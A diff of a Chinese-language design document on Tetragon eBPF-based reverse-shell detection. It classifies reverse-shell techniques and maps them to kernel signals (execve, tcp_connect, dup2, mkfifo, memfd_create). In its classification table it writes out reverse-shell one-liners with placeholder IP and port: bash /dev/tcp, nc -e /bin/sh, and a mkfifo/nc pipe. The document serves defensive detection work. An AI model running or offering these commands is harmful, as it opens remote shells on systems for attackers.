@@ -1,4 +1,4 @@
-# Tetragon 反弹 Shell 检测基础架构 — 共享基础设施深度分析
+# 反弹 Shell 检测基础架构 — 共享基础设施深度分析
 
 ## 文档定位
 
@@ -9,7 +9,7 @@
 | 序号 | 文档 | 主题 |
 |------|------|------|
 | **0** | **本文档** | **共享基础架构：Kprobe 框架、选择器编译、事件管道** |
-| 1 | tetragon-reverse-shell-process-execution-detection.md | 进程���行维度：execve 监控、二进制匹配 |
+| 1 | tetragon-reverse-shell-process-execution-detection.md | 进程运行维度：execve 监控、二进制匹配 |
 | 2 | tetragon-reverse-shell-network-connection-detection.md | 网络连接维度：tcp_connect、socket 操作 |
 | 3 | tetragon-reverse-shell-fd-redirection-detection.md | FD 重定向维度：dup2/dup3、FollowFD/CopyFD |
 | 4 | tetragon-reverse-shell-file-access-detection.md | 文件访问维度：fd_install、mkfifo、memfd_create |
@@ -30,13 +30,13 @@
 
 ### 1.1 反弹 Shell 分类体系
 
-反弹 Shell（Reverse Shell）是攻击者在获得初始代码执行能力后，将目标机器的 Shell 会话反向连接到攻击者控制的服务器的技术。根据实现机制和使���的工具，可将反弹 Shell 分为以下 7 类：
+反弹 Shell（Reverse Shell）是攻击者在获得初始代码执行能力后，将目标机器的 Shell 会话反向连接到攻击者控制的服务器的技术。根据实现机制和所使用的工具，可将反弹 Shell 分为以下 7 类：
 
 | 类别 | 典型命令/工具 | 内核行为特征 | 检测难度 |
 |------|-------------|-------------|---------|
 | **1. Bash 原生** | `bash -i >& /dev/tcp/IP/PORT 0>&1` | execve(bash) + connect() + dup2() | 低 |
 | **2. Netcat 类** | `nc -e /bin/sh IP PORT` / `mkfifo+nc+sh` | execve(nc/ncat) + connect() + [mkfifo] | 低-中 |
-| **3. ��本解释器** | Python `socket+dup2+exec`、Perl、PHP、Ruby | execve(python/perl/php) + socket() + dup2() | 中 |
+| **3. 脚本执行类** | Python `socket+dup2+exec`、Perl、PHP、Ruby | execve(python/perl/php) + socket() + dup2() | 中 |
 | **4. 管道链** | `mkfifo /tmp/f; nc IP PORT < /tmp/f \| sh > /tmp/f` | mkfifo() + execve(nc+sh) + open(FIFO) | 中 |
 | **5. 加密通道** | `openssl s_client`、`socat ssl:` | execve(openssl/socat) + connect() + SSL握手 | 高 |
 | **6. 无文件执行** | `memfd_create` + 远程下载 + `fexecve` | memfd_create() + write() + execveat() | 高 |
@@ -79,7 +79,7 @@ Tetragon 通过 4 个独立的检测维度覆盖上述行为：
 | Bash /dev/tcp | ✅ 匹配 bash + 参数 | ✅ tcp_connect | ✅ dup2 (bash 内建) | ✅ /dev/tcp 访问 |
 | Netcat -e | ✅ 匹配 nc 二进制 | ✅ tcp_connect | ❌ nc 内部处理 | ❌ |
 | Netcat mkfifo | ✅ 匹配 nc + sh | ✅ tcp_connect | ❌ | ✅ mkfifo 检测 |
-| Python/Perl/PHP | ✅ 解释器 + 参数 | ✅ tcp_connect | ✅ dup2 调用 | ❌ |
+| Python/Perl/PHP | ✅ 脚本执行 + 参数 | ✅ tcp_connect | ✅ dup2 调用 | ❌ |
 | OpenSSL/Socat | ✅ 匹配二进制 | ✅ tcp_connect | ❌ 内部处理 | ❌ |
 | Memfd 无文件 | ✅ i_nlink==0 | ✅ tcp_connect | ✅ dup2 调用 | ✅ memfd_create |
 | 自定义编译型 | ❌ 未知二进制 | ✅ tcp_connect | ✅ dup2 调用 | ❌ |
